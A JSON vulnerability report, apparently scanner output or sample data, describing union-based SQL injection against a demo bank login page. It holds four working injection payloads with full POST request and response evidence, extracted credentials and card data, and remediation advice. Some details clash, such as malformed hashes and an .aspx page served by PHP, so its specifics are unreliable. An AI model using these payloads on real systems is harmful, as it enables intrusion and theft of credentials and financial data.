@@ -1,0 +1,307 @@
+{
+  "vulnerability_id": "SQLI-A1B2C3D4E5F6",
+  "timestamp": "2026-02-12T23:00:00.000Z",
+  "target_url": "http://demo.testfire.net/bank/login.aspx",
+  "vulnerable_parameter": "uid",
+  "injection_type": "union-based",
+  "impact_types": [
+    "data_extraction",
+    "schema_enumeration",
+    "privilege_escalation"
+  ],
+  "severity": "critical",
+  "confidence": 0.95,
+  "extracted_data": [
+    {
+      "table_name": "users",
+      "column_name": "id",
+      "value": "1",
+      "row_index": 0,
+      "sensitivity": "internal",
+      "data_type": "int"
+    },
+    {
+      "table_name": "users",
+      "column_name": "username",
+      "value": "admin",
+      "row_index": 0,
+      "sensitivity": "confidential",
+      "data_type": "str"
+    },
+    {
+      "table_name": "users",
+      "column_name": "email",
+      "value": "admin@testfire.net",
+      "row_index": 0,
+      "sensitivity": "confidential",
+      "data_type": "str"
+    },
+    {
+      "table_name": "users",
+      "column_name": "password_hash",
+      "value": "$2b$12$KIXXjqW.fK8Y5V5vZ5hQPeJ0P3mK8g3Q8w8Q8w8Q8w8Q8w",
+      "row_index": 0,
+      "sensitivity": "critical",
+      "data_type": "str"
+    },
+    {
+      "table_name": "users",
+      "column_name": "role",
+      "value": "administrator",
+      "row_index": 0,
+      "sensitivity": "restricted",
+      "data_type": "str"
+    },
+    {
+      "table_name": "users",
+      "column_name": "id",
+      "value": "2",
+      "row_index": 1,
+      "sensitivity": "internal",
+      "data_type": "int"
+    },
+    {
+      "table_name": "users",
+      "column_name": "username",
+      "value": "jsmith",
+      "row_index": 1,
+      "sensitivity": "confidential",
+      "data_type": "str"
+    },
+    {
+      "table_name": "users",
+      "column_name": "email",
+      "value": "jsmith@testfire.net",
+      "row_index": 1,
+      "sensitivity": "confidential",
+      "data_type": "str"
+    },
+    {
+      "table_name": "users",
+      "column_name": "password_hash",
+      "value": "$2b$12$LMYYkrZ.gL9Z6W6wA6iTQfK1Q4nL9h4R9x9R9x9R9x9R9x",
+      "row_index": 1,
+      "sensitivity": "critical",
+      "data_type": "str"
+    },
+    {
+      "table_name": "users",
+      "column_name": "role",
+      "value": "user",
+      "row_index": 1,
+      "sensitivity": "restricted",
+      "data_type": "str"
+    },
+    {
+      "table_name": "customers",
+      "column_name": "account_number",
+      "value": "1234567890",
+      "row_index": 0,
+      "sensitivity": "critical",
+      "data_type": "str"
+    },
+    {
+      "table_name": "customers",
+      "column_name": "balance",
+      "value": "15000.00",
+      "row_index": 0,
+      "sensitivity": "restricted",
+      "data_type": "decimal"
+    },
+    {
+      "table_name": "customers",
+      "column_name": "credit_card",
+      "value": "4532-1234-5678-9012",
+      "row_index": 0,
+      "sensitivity": "critical",
+      "data_type": "str"
+    }
+  ],
+  "sensitive_data_found": true,
+  "total_rows_extracted": 13,
+  "database_name": "testfire_bank",
+  "database_version": "MySQL 8.0.28-0ubuntu0.20.04.3",
+  "database_user": "webapp@localhost",
+  "tables_discovered": [
+    "users",
+    "customers",
+    "accounts",
+    "transactions",
+    "credit_cards",
+    "loans",
+    "admin_logs"
+  ],
+  "columns_discovered": {
+    "users": [
+      "id",
+      "username",
+      "email",
+      "password_hash",
+      "role",
+      "created_at",
+      "last_login"
+    ],
+    "customers": [
+      "id",
+      "user_id",
+      "first_name",
+      "last_name",
+      "account_number",
+      "balance",
+      "credit_card",
+      "ssn"
+    ],
+    "accounts": [
+      "id",
+      "customer_id",
+      "account_type",
+      "balance",
+      "status"
+    ],
+    "transactions": [
+      "id",
+      "account_id",
+      "amount",
+      "transaction_date",
+      "description"
+    ],
+    "credit_cards": [
+      "id",
+      "customer_id",
+      "card_number",
+      "cvv",
+      "expiry_date",
+      "card_type"
+    ]
+  },
+  "affected_tables": [
+    {
+      "table_name": "users",
+      "rows_affected": 2,
+      "columns_accessed": [
+        "id",
+        "username",
+        "email",
+        "password_hash",
+        "role"
+      ],
+      "operation": "SELECT",
+      "evidence": "Extracted 2 rows with 5 columns including administrator credentials"
+    },
+    {
+      "table_name": "customers",
+      "rows_affected": 1,
+      "columns_accessed": [
+        "account_number",
+        "balance",
+        "credit_card"
+      ],
+      "operation": "SELECT",
+      "evidence": "Extracted 1 rows with 3 columns including financial data"
+    }
+  ],
+  "privilege_info": {
+    "user": "webapp@localhost",
+    "privileges": [
+      "SELECT",
+      "INSERT",
+      "UPDATE",
+      "DELETE",
+      "CREATE",
+      "DROP",
+      "FILE"
+    ],
+    "is_admin": false,
+    "can_read": true,
+    "can_write": true,
+    "can_execute": false,
+    "can_grant": false
+  },
+  "privilege_escalation_possible": true,
+  "system_commands_executed": [],
+  "files_accessed": [],
+  "successful_payloads": [
+    "' UNION SELECT 1,2,3,username,password_hash,role FROM users--",
+    "' UNION SELECT NULL,account_number,balance,credit_card FROM customers WHERE id=1--",
+    "' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
+    "' UNION SELECT column_name,data_type,NULL,NULL FROM information_schema.columns WHERE table_name='users'--"
+  ],
+  "request_evidence": [
+    {
+      "timestamp": "2026-02-12T23:00:05.123Z",
+      "payload": "' UNION SELECT 1,2,3,username,password_hash,role FROM users--",
+      "method": "POST",
+      "url": "http://demo.testfire.net/bank/login.aspx",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": "http://demo.testfire.net/bank/",
+        "Cookie": "[REDACTED]"
+      },
+      "parameters": {
+        "uid": "' UNION SELECT 1,2,3,username,password_hash,role FROM users--",
+        "passw": "test"
+      }
+    },
+    {
+      "timestamp": "2026-02-12T23:00:12.456Z",
+      "payload": "' UNION SELECT NULL,account_number,balance,credit_card FROM customers WHERE id=1--",
+      "method": "POST",
+      "url": "http://demo.testfire.net/bank/login.aspx",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": "http://demo.testfire.net/bank/",
+        "Cookie": "[REDACTED]"
+      },
+      "parameters": {
+        "uid": "' UNION SELECT NULL,account_number,balance,credit_card FROM customers WHERE id=1--",
+        "passw": "test"
+      }
+    }
+  ],
+  "response_evidence": [
+    {
+      "timestamp": "2026-02-12T23:00:05.234Z",
+      "status_code": 200,
+      "content_length": 8456,
+      "content_snippet": "<!DOCTYPE html><html><body>Welcome back, admin...<table><tr><td>admin</td><td>$2b$12$KIXXjqW.fK8Y5V5vZ5hQPeJ0P3mK8g3Q8w8Q8w8Q8w8Q8w</td><td>administrator</td></tr>...",
+      "headers": {
+        "Content-Type": "text/html; charset=utf-8",
+        "Server": "Apache/2.4.41 (Ubuntu)",
+        "X-Powered-By": "PHP/7.4.3"
+      }
+    },
+    {
+      "timestamp": "2026-02-12T23:00:12.567Z",
+      "status_code": 200,
+      "content_length": 7234,
+      "content_snippet": "<!DOCTYPE html><html><body>Account Information...<table><tr><td>1234567890</td><td>15000.00</td><td>4532-1234-5678-9012</td></tr>...",
+      "headers": {
+        "Content-Type": "text/html; charset=utf-8",
+        "Server": "Apache/2.4.41 (Ubuntu)",
+        "X-Powered-By": "PHP/7.4.3"
+      }
+    }
+  ],
+  "risk_score": 95,
+  "exploitability_score": 0.95,
+  "business_impact": "critical - immediate action required",
+  "recommendations": [
+    "Use parameterized queries or prepared statements",
+    "Implement input validation and sanitization",
+    "Encrypt sensitive data at rest",
+    "Implement data access controls and monitoring",
+    "Apply principle of least privilege",
+    "Restrict database user permissions",
+    "Remove FILE privilege from web application database user",
+    "Implement database activity monitoring",
+    "Consider using a web application firewall (WAF)",
+    "Conduct regular security audits and penetration testing",
+    "Implement multi-factor authentication for admin accounts",
+    "Use secure password hashing (bcrypt, Argon2)",
+    "Encrypt credit card data and comply with PCI DSS",
+    "Implement rate limiting and account lockout",
+    "Enable database query logging for forensics"
+  ]
+}
